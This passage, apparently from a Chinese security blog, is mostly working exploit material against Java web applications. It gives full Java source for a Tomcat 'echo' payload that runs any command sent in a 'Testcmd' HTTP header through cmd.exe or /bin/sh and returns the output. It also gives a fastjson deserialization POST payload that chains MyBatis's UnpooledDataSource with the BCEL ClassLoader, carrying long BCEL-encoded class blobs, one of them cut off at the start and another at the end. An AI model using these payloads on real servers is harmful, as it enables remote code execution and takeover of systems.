b4az_$d1LZ$f6$f2$81$V$O$_$d6$3b$ba$ba$cfr$b0$9d$7f$a1zBu$7d$ad$O$fa$f2$99$d2$Y$b9$sT$a8$60$ea$86t$cc$$F$t$9d$96$e1$98$c6b$fa$e2$R$c1$7e$3c$e0$d8$x$9f$d6mt$ba$86$9e$i$3d$bd$f5$e3$e0$8e$d1$86$c3$cd$b4$fa$i$o$89$d0T$84$8b$b1r$a3$f4$91$e8$r$ea$8b$B$d7$E$dc$3d$e1$i$3c$dd$e1$80$d7w$S$be$b8$3b$c0$c7$e2$9e$87$m$c4$e2$5e$b6$e6$e0o$f4$9e$84$Yw7$Q$dd$d9$9d$40I$dc$3d$O$89$Il$dbp$8a$ed$89$b3tG$7d$O$b3$Ce$k$5bQ$98$u$e5$f5$k$5b$a2$d1$be$cd$e2P$b3$t$Q$b0m$G$w$3d$93$e6$c8D$d8$937Al$ddWS$d2$fe$ff$x9F$99$A$M$faN$ae$b0$9f$e3$98M$U$96$af$b5$u$a3$b5$83$f2$b6$89$b2$b4$99h$9dt$bf$9d8o$82$85$z8$80$$$dcG$rx$98h$e3$94$fe$e3T$80$d3$94$d5$a7$89$f3$F$f4$d2$_0$H$ee$e7a$f2x$d5$f3$d8$c8$e3$96$L$d8$c0c$H$8f$5b$R$cfW$ad$8e$caA$l$TN9$f0$A$dcv9Vr$b6$d7$U$96$f8$m$aa$c3$N9TugQ$da$ec$a1$C$cd$e9$c9$5ez$ae$f11H$tP$jo$YG$cd$e9FO$O$c1F$S$98$7b$944$96$a2$92$be$e4$ab$f3A$y$87D$eb$O$3a$dd$K$9e$y$95b$X$dd$dfF$f7$afF$Nn$t$ac$dc$81EPP$8b$E$c2$Y$m$feA$db$f1$Kx$$$80$e7$b1$8b$9c$ed$e1q$9b_$wpY$m$e1$3c$d8$dc$s$9dJ$A$d7$cd$ee$96$J$cc$cba$7e$e0$9a$J$y8$83$85$f4$d7$e5$5e3$bf$e1$d4$R$d7$f5$N$f3$97$f7$84$cf$ba$96$90$fb$8b$9a$3dAO$60q$O$d7$kvU$d1$ee$V$b4$hs$95$84$D$b5$q$d6$ec$Nz$l$c5$921$ee$a5$a07$b0$94$I$81el$J$d9WY$I$cd$be$y$f7$y$5d$d5$db$s$g$9a$7d$ee$V$7c$V$l$f4$jG$p$87$p$dc$a9$a0$af$8a$3f$8e$b0$L$cdBP$ID$f2$gY$fd$a3n$aa$3f$d5$3e$e8$a5$8dH$85o$f6$3b$X$d7$e5q$d3$U$b3o$3dyX7$c5$D$cb$c7q$3d$83$c8$Z41$9f$cfb$uH$89$be$e10$94$a0$9fI$be$d2$91tZ$a3$3c$e8$f7$5c$ee$88$K$9cc$7d$c0$e0$e5$b0$ae$f0N$g$89$7b$f2$96$fc$de$Z$96$e2d$c3$W$f1$b4$5c$cd$b3$hgz6$96$f7$ec$de$ff$c1$b3$c0$ca$J$ac$ca$a19$d0$c2$w$80$m$f5$7c$TY$5b$cd$5c$5cC$zO$dedQ$9d$a7$aee$d4u$O$b5Y$M$faO$60$7d$fc$E6$c4$83$e28Zsh$cba$e38$da$D$j9l$caas$O$9d$T$b8$89$e2$m$d7Jl$d7$c6P5w$M$VA$ff$E$b6$e4$d0$e50$Q$c5$97$85$ff$m$cfe$_$ae$9e$3c$b8$b8$ec$85$t$b2$f0la$8d$d9$D$99pYG$f0$earm$a5$a7$83$e9$p$I$d1$w$d0$c9O$cdZ$82$f9$84$f1E$84$ecZ$ccB$3d5$edZ$94S$dbV$90t$r$c9W$93$86$d9$84$ec$wh$84$f8$M$e6$e2$m$e6$e1$k$92$ba$9f$d0$7f$M$L$f0$M$W$e2$3c$Wq$d5X$ccu$e2Zn$L$96p$fb$b0$94$bb$h$cb$b8$a3$Iq$e7Q$e7$aa$40$bd$ab$92$90U$8b$88k9$9a$5c$x$b0$dc$b5$Ks$5d$eb$b0$c2$d5$86$h$5d$j$uqua$jy$b9$c6$b5$8d$feU$ed$b5$bb$ae$fc$o$aa9$k$L$b9K4$t$7c$f6$8e$c7$ed$3c$ee$a0$v$A$da$ca$d4d$b3x$f4s$X$f0$a4$3d$Yv$bc$84C$dby$uuR$c5$L$f0$bd$I$ef$r$g$3fn$5b$Q$f87$bc$ad$q$c3$e6y$82$d4$bb$a0$fe$H$d8$3e$ebc$Z$Q$A$A&quot;&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"EXP-Tomcat\"><a href=\"#EXP-Tomcat\" class=\"headerlink\" title=\"EXP(Tomcat)\"></a>EXP(Tomcat)</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> payload;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Created by IntelliJ IDEA.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Author</span>: Garckz</span></span><br><span class=\"line\"><span class=\"comment\"> * Date: 2023/5/8</span></span><br><span class=\"line\"><span class=\"comment\"> * Time: &#123;TIME&#125;</span></span><br><span class=\"line\"><span class=\"comment\"> * To change this template use File | Settings | File Templates.</span></span><br><span class=\"line\"><span class=\"comment\"> **/</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.List;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Scanner;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">TomcatEcho</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">TomcatEcho</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//通过反射调用Class.forName()方法获取外部类的实例，并传入对应的请求体数据。</span></span><br><span class=\"line\">    <span class=\"comment\">//如果当前执行环境中存在org.apache.tomcat.util.buf.ByteChunk类，则创建该类的实例并通过setBytes()方法将byte数组拷贝至该实例并构造一个ByteBuffer对象；如果不存在则直接通过ByteBuffer的wrap()方法构造该对象。</span></span><br><span class=\"line\">    <span class=\"comment\">//在输出流中调用反射获取到的外部类方法doWrite()，并将实例化后的字节数据对象作为该方法的参数，从而完成对byte数组写入输出流的操作。</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">writeBody</span><span class=\"params\">(Object var0, <span class=\"type\">byte</span>[] var1)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        Object var2;</span><br><span class=\"line\">        Class var3;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            var3 = Class.forName(<span class=\"string\">&quot;org.apache.tomcat.util.buf.ByteChunk&quot;</span>);</span><br><span class=\"line\">            var2 = var3.newInstance();</span><br><span class=\"line\">            var3.getDeclaredMethod(<span class=\"string\">&quot;setBytes&quot;</span>, <span class=\"type\">byte</span>[].class, Integer.TYPE, Integer.TYPE).invoke(var2, var1, <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;<span class=\"keyword\">new</span> <span class=\"title class_\">Integer</span>(<span class=\"number\">0</span>), <span class=\"keyword\">new</span> <span class=\"title class_\">Integer</span>(var1.length)&#125;);</span><br><span class=\"line\">            var0.getClass().getMethod(<span class=\"string\">&quot;doWrite&quot;</span>, var3).invoke(var0, var2);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (ClassNotFoundException var5) &#123;</span><br><span class=\"line\">            var3 = Class.forName(<span class=\"string\">&quot;java.nio.ByteBuffer&quot;</span>);</span><br><span class=\"line\">            var2 = var3.getDeclaredMethod(<span class=\"string\">&quot;wrap&quot;</span>, <span class=\"type\">byte</span>[].class).invoke(var3, var1);</span><br><span class=\"line\">            var0.getClass().getMethod(<span class=\"string\">&quot;doWrite&quot;</span>, var3).invoke(var0, var2);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (NoSuchMethodException var6) &#123;</span><br><span class=\"line\">            var3 = Class.forName(<span class=\"string\">&quot;java.nio.ByteBuffer&quot;</span>);</span><br><span class=\"line\">            var2 = var3.getDeclaredMethod(<span class=\"string\">&quot;wrap&quot;</span>, <span class=\"type\">byte</span>[].class).invoke(var3, var1);</span><br><span class=\"line\">            var0.getClass().getMethod(<span class=\"string\">&quot;doWrite&quot;</span>, var3).invoke(var0, var2);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Object <span class=\"title function_\">getFV</span><span class=\"params\">(Object var0, String var1)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">Field</span> <span class=\"variable\">var2</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">        <span class=\"type\">Class</span> <span class=\"variable\">var3</span> <span class=\"operator\">=</span> var0.getClass();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">while</span>(var3 != Object.class) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                var2 = var3.getDeclaredField(var1);</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (NoSuchFieldException var5) &#123;</span><br><span class=\"line\">                var3 = var3.getSuperclass();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (var2 == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">NoSuchFieldException</span>(var1);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            var2.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> var2.get(var0);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    <span class=\"keyword\">static</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"type\">boolean</span> <span class=\"variable\">var0</span> <span class=\"operator\">=</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">            Thread[] var1 = (Thread[])((Thread[])getFV(Thread.currentThread().getThreadGroup(), <span class=\"string\">&quot;threads&quot;</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">for</span>(<span class=\"type\">int</span> <span class=\"variable\">var2</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; var2 &lt; var1.length; ++var2) &#123;</span><br><span class=\"line\">                <span class=\"type\">Thread</span> <span class=\"variable\">var3</span> <span class=\"operator\">=</span> var1[var2];</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (var3 != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                    <span class=\"type\">String</span> <span class=\"variable\">var4</span> <span class=\"operator\">=</span> var3.getName();</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (!var4.contains(<span class=\"string\">&quot;exec&quot;</span>) &amp;&amp; var4.contains(<span class=\"string\">&quot;http&quot;</span>)) &#123;</span><br><span class=\"line\">                        <span class=\"type\">Object</span> <span class=\"variable\">var5</span> <span class=\"operator\">=</span> getFV(var3, <span class=\"string\">&quot;target&quot;</span>);</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> (var5 <span class=\"keyword\">instanceof</span> Runnable) &#123;</span><br><span class=\"line\">                            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                                var5 = getFV(getFV(getFV(var5, <span class=\"string\">&quot;this$0&quot;</span>), <span class=\"string\">&quot;handler&quot;</span>), <span class=\"string\">&quot;global&quot;</span>);</span><br><span class=\"line\">                            &#125; <span class=\"keyword\">catch</span> (Exception var11) &#123;</span><br><span class=\"line\">                                <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                            <span class=\"type\">List</span> <span class=\"variable\">var6</span> <span class=\"operator\">=</span> (List)getFV(var5, <span class=\"string\">&quot;processors&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">                            <span class=\"keyword\">for</span>(<span class=\"type\">int</span> <span class=\"variable\">var7</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; var7 &lt; var6.size(); ++var7) &#123;</span><br><span class=\"line\">                                <span class=\"type\">Object</span> <span class=\"variable\">var8</span> <span class=\"operator\">=</span> var6.get(var7);</span><br><span class=\"line\">                                var5 = getFV(var8, <span class=\"string\">&quot;req&quot;</span>);</span><br><span class=\"line\">                                <span class=\"type\">Object</span> <span class=\"variable\">var9</span> <span class=\"operator\">=</span> var5.getClass().getMethod(<span class=\"string\">&quot;getResponse&quot;</span>).invoke(var5);</span><br><span class=\"line\">                                var4 = (String)var5.getClass().getMethod(<span class=\"string\">&quot;getHeader&quot;</span>, String.class).invoke(var5, <span class=\"keyword\">new</span> <span class=\"title class_\">String</span>(<span class=\"string\">&quot;Testecho&quot;</span>));</span><br><span class=\"line\">                                <span class=\"keyword\">if</span> (var4 != <span class=\"literal\">null</span> &amp;&amp; !var4.isEmpty()) &#123;</span><br><span class=\"line\">                                    var9.getClass().getMethod(<span class=\"string\">&quot;setStatus&quot;</span>, Integer.TYPE).invoke(var9, <span class=\"keyword\">new</span> <span class=\"title class_\">Integer</span>(<span class=\"number\">200</span>));</span><br><span class=\"line\">                                    var9.getClass().getMethod(<span class=\"string\">&quot;addHeader&quot;</span>, String.class, String.class).invoke(var9, <span class=\"keyword\">new</span> <span class=\"title class_\">String</span>(<span class=\"string\">&quot;Testecho&quot;</span>), var4);</span><br><span class=\"line\">                                    var0 = <span class=\"literal\">true</span>;</span><br><span class=\"line\">                                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                                var4 = (String)var5.getClass().getMethod(<span class=\"string\">&quot;getHeader&quot;</span>, String.class).invoke(var5, <span class=\"keyword\">new</span> <span class=\"title class_\">String</span>(<span class=\"string\">&quot;Testcmd&quot;</span>));</span><br><span class=\"line\">                                <span class=\"keyword\">if</span> (var4 != <span class=\"literal\">null</span> &amp;&amp; !var4.isEmpty()) &#123;</span><br><span class=\"line\">                                    var9.getClass().getMethod(<span class=\"string\">&quot;setStatus&quot;</span>, Integer.TYPE).invoke(var9, <span class=\"keyword\">new</span> <span class=\"title class_\">Integer</span>(<span class=\"number\">200</span>));</span><br><span class=\"line\">                                    String[] var10 = System.getProperty(<span class=\"string\">&quot;os.name&quot;</span>).toLowerCase().contains(<span class=\"string\">&quot;window&quot;</span>) ? <span class=\"keyword\">new</span> <span class=\"title class_\">String</span>[]&#123;<span class=\"string\">&quot;cmd.exe&quot;</span>, <span class=\"string\">&quot;/c&quot;</span>, var4&#125; : <span class=\"keyword\">new</span> <span class=\"title class_\">String</span>[]&#123;<span class=\"string\">&quot;/bin/sh&quot;</span>, <span class=\"string\">&quot;-c&quot;</span>, var4&#125;;</span><br><span class=\"line\">                                    writeBody(var9, (<span class=\"keyword\">new</span> <span class=\"title class_\">Scanner</span>((<span class=\"keyword\">new</span> <span class=\"title class_\">ProcessBuilder</span>(var10)).start().getInputStream())).useDelimiter(<span class=\"string\">&quot;\\\\A&quot;</span>).next().getBytes());</span><br><span class=\"line\">                                    var0 = <span class=\"literal\">true</span>;</span><br><span class=\"line\">                                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                                <span class=\"keyword\">if</span> ((var4 == <span class=\"literal\">null</span> || var4.isEmpty()) &amp;&amp; var0) &#123;</span><br><span class=\"line\">                                    writeBody(var9, System.getProperties().toString().getBytes());</span><br><span class=\"line\">                                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                                <span class=\"keyword\">if</span> (var0) &#123;</span><br><span class=\"line\">                                    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                                &#125;</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                            <span class=\"keyword\">if</span> (var0) &#123;</span><br><span class=\"line\">                                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (Exception var12) &#123;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"MyEXP-Tomcat\"><a href=\"#MyEXP-Tomcat\" class=\"headerlink\" title=\"MyEXP(Tomcat)\"></a>MyEXP(Tomcat)</h2><h2 id=\"abitis-回显EXP\"><a href=\"#abitis-回显EXP\" class=\"headerlink\" title=\"abitis 回显EXP\"></a>abitis 回显EXP</h2><figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">    &lt;groupId&gt;org.mybatis&lt;/groupId&gt;</span><br><span class=\"line\">  &lt;artifactId&gt;mybatis&lt;/artifactId&gt;</span><br><span class=\"line\">  &lt;version&gt;<span class=\"number\">3.5</span><span class=\"number\">.2</span>&lt;/version&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>\n\n\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">POST</span><br><span class=\"line\"></span><br><span class=\"line\">Testcmd<span class=\"punctuation\">:</span>whoami</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;@type&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class=\"punctuation\">,</span><span class=\"attr\">&quot;name&quot;</span><span class=\"punctuation\">:</span><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;@type&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;java.lang.Class&quot;</span><span class=\"punctuation\">,</span><span class=\"attr\">&quot;val&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span><span class=\"attr\">&quot;c&quot;</span><span class=\"punctuation\">:</span><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;@type&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span><span class=\"punctuation\">,</span><span class=\"attr\">&quot;key&quot;</span><span class=\"punctuation\">:</span><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;@type&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;java.lang.Class&quot;</span><span class=\"punctuation\">,</span><span class=\"attr\">&quot;val&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span><span class=\"attr\">&quot;driverClassLoader&quot;</span><span class=\"punctuation\">:</span><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;@type&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span><span class=\"attr\">&quot;driver&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;&#123;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$a5Wyx$Ug$Z$ff$cd$5e3$3b$99$90dCB$W$uG$N$b09v$b7$a1$95B$c2$99$90$40J$S$u$hK$97P$db$c9$ec$q$3bd3$Tfg$J$a0$b6$k$d4$D$8fZ$8f$daPO$b4$ae$b7P$eb$s$U9$eaA$b1Z$8fzT$ad$d6zk$f1$f6$8f$da$f6$B$7c$bf$99$N$d9$84$ad$3c$3e$sy$be$f9$be$f7$7b$ef$f7$f7$be3y$fc$e2$p$a7$A$dc$80$7f$89$Q1$m$60P$84$PI$b6h$Cv$f3$Y$e2$91$f2$a3$E$c3$8c$a4$f30x$8c$88t$de$p$c2D$9a$JY$C2$ecr$_$8fQ$B$fb$E$ec$e7q$80$R$5e$c3$e3$b5$ec$f9$3a$R$d5$b8S$c4$5dx$3d$5b$de$m$e2$8dx$T$5b$O$K$b8$5bD7$de$cc$e3$z$ec$fcV$Bo$T$d1$84C$C$de$$$e0$j$3c$de$v$e0$5d$C$ee$R$f0n$k$f7$Kx$P$8f$f7$96$a0$B$efc$cb$fb$F$dc$t$e0$D$C$ee$e71$s$e00$T$bc$93$z$P$I$f8$a0$80$P$J$f8$b0$80$8f$88$f8$u$3e$c6$a8G$E$7c$5c$c0$t$E$3c$u$e0$93$C$b2$3c$3e$c5$e3$d3$o6$e03l$f9$ac$88$cf$e1$f3$o$d6$e3$L$C$be$c8$9eG$d9r$8c$89$3e$c4$7c$fc$S$d3$f4$b0$88$_$p$c7c$9c$83o$b5$a6k$d6Z$O$eeP$dd$z$i$3cmFB$e5P$d6$a5$e9jOf$b8_5$7b$e5$fe$UQ$fc$a3$a6f$a9$adFb$3f$879$a1$ae$dd$f2$5e9$9a$92$f5$c1$e8$d6$fe$dd$aab$b5$f4$b52$f1$d2$98$r$xC$dd$f2$88$zE$89$a4$U$da$b9$k$e2$m$b6$efS$d4$RK3$f44$H$ef$a0ju$90$c0$ca$o$aa$K$u1$cb$d4$f4$c1$96$ba$x$99xLPY8$I$ab$95$94$j$B$8f$e3$94$40$ca$_$r$97$c7$pd$_fdLE$ed$d0$98$fbe$bd$c6$b0$o$5b$edJ$d2$880$5d$Sz$b0$95C$ada$OF$e4$RYI$aa$R$cb$e6$88d$y$z$V$e9$cf$MDZ$f7$5bj$5b2$a3$PI8$81$afH8$89Sd$$$adZ$ec$82B$u$9b$f2$a9$z$r$a7$89$e2$eak$95p$gg$q$3c$8a$afr$u$9f$e94$87$8a$vR$a7n$a9$83$aa$c9$i$f9$g$8f$afK$f8$G$ceJx$M$e78$f0$Jc$H$cb$b6$84o2$3d$8bf$Y$ea1$ac$O$p$a3$t$$$e7$93C$rc$89$e8$9aa$7b$dd$9a$Z$YPM$w$e6$a8$v$8fpX8$r$dfc$c42J$b2$5b$b5$92$c6$94$b8$84$c7$f1$z$O$Lf$b2uhj$aa$90$eb$db8$c7$bc$7d$82R$_$e1$3b$f8$ae$84$ef$e1$fb$94v$JO$e2$H$S$7e$88$l$91$ebV$d2T$e5DZ$c2N$f4$91_$7d$F$95$eb$b5$afZ$q$fc$YO$91s$ea$3eU$91$f0$T$fc$94$f6I$cb$oG$7d$96l$S$$8$E$a6$84$b6gt$ddA$a0$cfJj$e9$da$eb$c8FR$d6$T$v$W$a0o0e$f4$cb$a9$7c$fc$8e$40AV$c4$R$d3P$d4t$da0$a98$b3l$WV$ddh$97$96$b6$q$fc$MO$b3$I$7eN$d07$d5$3d$iJ$c8$f4v5$3dB$f8dx$a7$d3fr$97$99$v$9f$JH$c2A$af$9a$b6TB$93$84_$e0$Zb$t$5c$Q$f6$ad$MY$f2$cb$89$c4$a4$u$cf$f8$94$e1$E$ed$8ctD$97$87$a9$v$7e$v$e1Y$fcJ$c2$afY$g$7c$a3$9a$9e0F$e9$9e$b8$o$94$T$82QT$a1c$b4_$d3$a3$e9$q$j$c3$ca$qpl$efc$8a$ac$ebLw$cd$94$5b$db$9c$40$5b3Z$w$e1$60$ea7$S$7e$8b$df$f1$f8$bd$84$3f$e0$8f$8c$f2$tR$b5k$83$84$e7p$5e$c2$9f$f1$94$84$bf$e0$af$S$b6$p$s$e1o$f8$3b$8f$7fH$f8$tsi$9eb$MG$H$e4$b4$b5$3bm$e8$d1$bd$99Tt$aay$a8$f9$a7$ac$9a$ea$40$8a$60$j$b5$812$zMN$a9g$d4$3f$df$cc$U$db$80a$f6P$w8$y$J$fd$f7f$b7$f1N$S$r$ba$3a$da$a9$a7$zYWHjv$a8$c8$40$m$U$f5$c6$b7$b5S$aa$8a$c8WP57$aaJJ6$d5$84$83$7e$O$eb$8b$d8$ee$bbB$b6$d0$d2d$bc$8e$Gf1$d4$c9$a6$5e$cd$cb$b1Py5$7d$af1D$3e$af$w63$af$q$V$NL$m$ef$f3$p$a62T$y$3d$M$ac$93$W$cb$LB$cd$X$s$7c$95$yO$ab$p$a9$x$r$V$b1$cc$88j$w$8e$d1$aab$f2l$da$T$e87$u$Mx$9a$dd$a1$9e$d0NFv$db$3d$bc$b4H$c0E$a3$xU2$a6$a9$ea$d6$qf$a6W7$3f4$a8$7fI$abs$d8d$g$Z$9a$W$c1$o$7c$f6$VC$Y1$3b$I$9b$ae$ed2$E$F$c5$d0$zYc$af$a2y$85$8e$b6$re3$a6$ee$c9$a8$E$b4$96$ba$9d$USZ$3b$a0$dao$c7N$96$88$ce$a2$n$f0Z$ba$7dx$c4$dao$f3$ed$9c$3e0$f6$d3$9c$Yv$a6$Lu$v$r$95$b1$z$bdJE$$$fbYb$Z$5d$c6$a8j$b6$c9l$uU$87$8a$f4$TK$b9$97Z$c3$b4$98$83$85Z$f2S$a1e$da$7b$tOt$S$da$a9$8fdhnQ$ea$86$d9k$3d$_$ac$Z$d1$82$L$S$af$J$V$bd$60$96$a5LZ$dd$a8$a6$b4az_$d1LZ$f6$f2$81$V$O$_$d6$3b$ba$ba$cfr$b0$9d$7f$a1zBu$7d$ad$O$fa$f2$99$d2$Y$b9$sT$a8$60$ea$86t$cc$$F$t$9d$96$e1$98$c6b$fa$e2$R$c1$7e$3c$e0$d8$x$9f$d6mt$ba$86$9e$i$3d$bd$f5$e3$e0$8e$d1$86$c3$cd$b4$fa$i$o$89$d0T$84$8b$b1r$a3$f4$91$e8$r$ea$8b$B$d7$E$dc$3d$e1$i$3c$dd$e1$80$d7w$S$be$b8$3b$c0$c7$e2$9e$87$m$c4$e2$5e$b6$e6$e0o$f4$9e$84$Yw7$Q$dd$d9$9d$40I$dc$3d$O$89$Il$dbp$8a$ed$89$b3tG$7d$O$b3$Ce$k$5bQ$98$u$e5$f5$k$5b$a2$d1$be$cd$e2P$b3$t$Q$b0m$G$w$3d$93$e6$c8D$d8$937Al$ddWS$d2$fe$ff$x9F$99$A$M$faN$ae$b0$9f$e3$98M$U$96$af$b5$u$a3$b5$83$f2$b6$89$b2$b4$99h$9dt$bf$9d8o$82$85$z8$80$$$dcG$rx$98h$e3$94$fe$e3T$80$d3$94$d5$a7$89$f3$F$f4$d2$_0$H$ee$e7a$f2x$d5$f3$d8$c8$e3$96$L$d8$c0c$H$8f$5b$R$cfW$ad$8e$caA$l$TN9$f0$A$dcv9Vr$b6$d7$U$96$f8$m$aa$c3$N9TugQ$da$ec$a1$C$cd$e9$c9$5ez$ae$f11H$tP$jo$YG$cd$e9FO$O$c1F$S$98$7b$944$96$a2$92$be$e4$ab$f3A$y$87D$eb$O$3a$dd$K$9e$y$95b$X$dd$dfF$f7$afF$Nn$t$ac$dc$81EPP$8b$E$c2$Y$m$feA$db$f1$Kx$$$80$e7$b1$8b$9c$ed$e1q$9b_$wpY$m$e1$3c$d8$dc$s$9dJ$A$d7$cd$ee$96$J$cc$cba$7e$e0$9a$J$y8$83$85$f4$d7$e5$5e3$bf$e1$d4$R$d7$f5$N$f3$97$f7$84$cf$ba$96$90$fb$8b$9a$3dAO$60q$O$d7$kvU$d1$ee$V$b4$hs$95$84$D$b5$q$d6$ec$Nz$l$c5$921$ee$a5$a07$b0$94$I$81el$J$d9WY$I$cd$be$y$f7$y$5d$d5$db$s$g$9a$7d$ee$V$7c$V$l$f4$jG$p$87$p$dc$a9$a0$af$8a$3f$8e$b0$L$cdBP$ID$f2$gY$fd$a3n$aa$3f$d5$3e$e8$a5$8dH$85o$f6$3b$X$d7$e5q$d3$U$b3o$3dyX7$c5$D$cb$c7q$3d$83$c8$Z41$9f$cfb$uH$89$be$e10$94$a0$9fI$be$d2$91tZ$a3$3c$e8$f7$5c$ee$88$K$9cc$7d$c0$e0$e5$b0$ae$f0N$g$89$7b$f2$96$fc$de$Z$96$e2d$c3$W$f1$b4$5c$cd$b3$hgz6$96$f7$ec$de$ff$c1$b3$c0$ca$J$ac$ca$a19$d0$c2$w$80$m$f5$7c$TY$5b$cd$5c$5cC$zO$dedQ$9d$a7$aee$d4u$O$b5Y$M$faO$60$7d$fc$E6$c4$83$e28Zsh$cba$e38$da$D$j9l$caas$O$9d$T$b8$89$e2$m$d7Jl$d7$c6P5w$M$VA$ff$E$b6$e4$d0$e50$Q$c5$97$85$ff$m$cfe$_$ae$9e$3c$b8$b8$ec$85$t$b2$f0la$8d$d9$D$99pYG$f0$earm$a5$a7$83$e9$p$I$d1$w$d0$c9O$cdZ$82$f9$84$f1E$84$ecZ$ccB$3d5$edZ$94S$dbV$90t$r$c9W$93$86$d9$84$ec$wh$84$f8$M$e6$e2$m$e6$e1$k$92$ba$9f$d0$7f$M$L$f0$M$W$e2$3c$Wq$d5X$ccu$e2Zn$L$96p$fb$b0$94$bb$h$cb$b8$a3$Iq$e7Q$e7$aa$40$bd$ab$92$90U$8b$88k9$9a$5c$x$b0$dc$